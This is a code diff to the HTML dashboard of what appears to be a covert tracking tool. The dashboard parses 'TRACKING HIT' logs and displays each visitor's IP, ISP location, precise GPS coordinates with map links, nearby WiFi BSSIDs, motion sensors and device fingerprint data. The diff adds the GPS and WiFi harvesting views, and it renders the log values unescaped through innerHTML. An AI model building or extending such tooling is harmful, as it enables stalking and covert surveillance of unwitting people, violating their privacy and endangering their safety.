@@ -85,16 +85,6 @@
             border-bottom: 1px solid #21262d;
         }
 
-        .section-title {
-            font-size: 0.8em;
-            text-transform: uppercase;
-            color: #8b949e;
-            margin-top: 10px;
-            margin-bottom: 4px;
-            letter-spacing: 0.5px;
-            border-bottom: 1px solid #21262d;
-        }
-
         .data-row {
             margin-bottom: 8px;
             font-size: 0.85em;
@@ -108,15 +98,13 @@
             width: 80px;
         }
 
-        .json-block {
-            background: #000;
-            padding: 5px;
-            border-radius: 4px;
-            font-family: monospace;
-            white-space: pre-wrap;
-            margin-top: 5px;
-            font-size: 0.8em;
-            color: #7ee787;
+        a {
+            color: #58a6ff;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
@@ -145,20 +133,21 @@
                 }
 
                 // Parse the raw text log
-                // Format: "TRACKING HIT - ..." ... "-----------------------------"
                 const rawLogs = data.logs.split('-----------------------------').filter(l => l.trim().length > 0).reverse();
 
                 container.innerHTML = rawLogs.map(logBlock => {
                     const lines = logBlock.trim().split('\n');
                     let entry = { raw: logBlock };
 
-                    // Simple parsing logic
+                    // Parsing Logic
                     lines.forEach(line => {
                         if (line.includes('TRACKING HIT')) entry.time = line.split(' - ')[1];
                         if (line.startsWith('IP USED:')) entry.ip = line.split(': ')[1];
                         if (line.startsWith('LOCATION:')) entry.location = safeJSON(line.substring(9));
+                        if (line.startsWith('GPS:')) entry.gps = safeJSON(line.substring(4));
                         if (line.startsWith('SENSORS:')) entry.sensors = safeJSON(line.substring(8));
                         if (line.startsWith('CLIENT DATA:')) entry.client = safeJSON(line.substring(12));
+                        if (line.startsWith('WIFI:')) entry.wifi = safeJSON(line.substring(5));
                         if (line.startsWith('FINGERPRINT:')) entry.fingerprint = safeJSON(line.substring(12));
                     });
 
@@ -176,33 +165,83 @@
 
         function createCard(entry) {
             let html = `<div class="card">`;
+
+            // Header
             html += `<div class="card-header">
                         <span>${entry.time || 'Unknown Time'}</span>
-                        <span>${entry.ip || ''}</span>
+                        <span style="color:white">${entry.ip || ''}</span>
                      </div>`;
 
+            // Location (ISP)
             if (entry.location && typeof entry.location === 'object') {
-                html += `<div class="data-row"><span class="label">City:</span> ${entry.location.city || 'N/A'}</div>`;
+                html += `<div class="section-title">🌍 ISP Location</div>`;
+                html += `<div class="data-row"><span class="label">City:</span> ${entry.location.city || 'N/A'}, ${entry.location.region || ''}</div>`;
                 html += `<div class="data-row"><span class="label">ISP:</span> ${entry.location.org || 'N/A'}</div>`;
-            }
-
-            if (entry.client && typeof entry.client === 'object') {
-                html += `<div class="data-row"><span class="label">Device:</span> ${entry.client.viewport || 'N/A'}</div>`;
-            }
-
-            if (entry.sensors && typeof entry.sensors === 'object') {
-                const s = entry.sensors;
-                if (s.accel) {
-                    html += `<div class="data-row"><span class="label">Motion:</span> X:${s.accel.x} Y:${s.accel.y} Z:${s.accel.z}</div>`;
-                } else {
-                    html += `<div class="data-row"><span class="label">Motion:</span> ${s.status || 'None'}</div>`;
+                const loc = entry.location.loc || '';
+                if (loc) {
+                    html += `<div class="data-row"><span class="label">Coords:</span> <a href="https://www.google.com/maps?q=${loc}" target="_blank">${loc}</a></div>`;
                 }
             }
 
-            // Raw JSON expandable details? Just showing fingerprint simply for now
+            // GPS (Precise)
+            if (entry.gps && typeof entry.gps === 'object') {
+                // Check if it's a valid GPS object with lat/lng
+                const lat = entry.gps.lat || entry.gps.latitude;
+                const lng = entry.gps.lng || entry.gps.longitude;
+
+                if (lat && lng) {
+                    html += `<div class="section-title" style="color: #ff6b6b; border-color: #ff6b6b;">🎯 GPS (Precise)</div>`;
+                    html += `<div class="data-row"><span class="label">Coords:</span> <a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" style="color:#ff6b6b; font-weight:bold;">${lat}, ${lng}</a></div>`;
+                    html += `<div class="data-row"><span class="label">Accuracy:</span> ${entry.gps.accuracy || entry.gps.acc || 'N/A'} meters</div>`;
+                } else if (entry.gps.error) {
+                    html += `<div class="section-title">🎯 GPS</div>`;
+                    html += `<div class="data-row"><span class="label">Status:</span> <span style="color: #8b949e;">${entry.gps.error}</span></div>`;
+                }
+            }
+
+            // Client Data
+            if (entry.client && typeof entry.client === 'object') {
+                html += `<div class="section-title">📱 Device & Page</div>`;
+                html += `<div class="data-row"><span class="label">Viewport:</span> ${entry.client.viewport || 'N/A'}</div>`;
+                html += `<div class="data-row"><span class="label">Url:</span> ${entry.client.url ? entry.client.url.split('/').pop() : 'N/A'}</div>`;
+            }
+
+            // Sensors
+            if (entry.sensors && typeof entry.sensors === 'object') {
+                html += `<div class="section-title">🧭 Sensors</div>`;
+                if (entry.sensors.accel) {
+                    html += `<div class="data-row"><span class="label">Motion:</span> X:${entry.sensors.accel.x} Y:${entry.sensors.accel.y} Z:${entry.sensors.accel.z}</div>`;
+                } else {
+                    html += `<div class="data-row"><span class="label">Status:</span> ${entry.sensors.status || 'None'}</div>`;
+                }
+            }
+
+            // WiFi
+            if (entry.wifi && typeof entry.wifi === 'object') {
+                html += `<div class="section-title">📶 WiFi</div>`;
+                if (Array.isArray(entry.wifi)) {
+                    // Check if empty array
+                    if (entry.wifi.length === 0) {
+                        html += `<div class="data-row">No networks found</div>`;
+                    } else {
+                        entry.wifi.forEach(w => {
+                            html += `<div class="data-row">📡 ${w.bssid || 'Unknown'} (${w.signal || '?'}dBm)</div>`;
+                        });
+                    }
+                } else {
+                    html += `<div class="data-row">${entry.wifi.status || entry.wifi.error || 'N/A'}</div>`;
+                }
+            }
+
+            // Fingerprint
             if (entry.fingerprint && typeof entry.fingerprint === 'object') {
+                html += `<div class="section-title">🔍 Fingerprint</div>`;
                 const bat = entry.fingerprint.battery || {};
-                html += `<div class="data-row"><span class="label">Battery:</span> ${bat.level ? (bat.level * 100) + '%' : 'N/A'} ${bat.charging ? '⚡' : ''}</div>`;
+                html += `<div class="data-row"><span class="label">Battery:</span> ${bat.level ? Math.round(bat.level * 100) + '%' : 'N/A'} ${bat.charging ? '⚡' : ''}</div>`;
+                html += `<div class="data-row"><span class="label">System:</span> ${entry.fingerprint.platform || 'N/A'} (${entry.fingerprint.cores || '?'} cores)</div>`;
+                if (entry.fingerprint.connection && entry.fingerprint.connection !== 'unsupported') {
+                    html += `<div class="data-row"><span class="label">Net:</span> ${entry.fingerprint.connection.type || ''} (${entry.fingerprint.connection.downlink || '?'} Mbps)</div>`;
+                }
             }
 
             html += `</div>`;
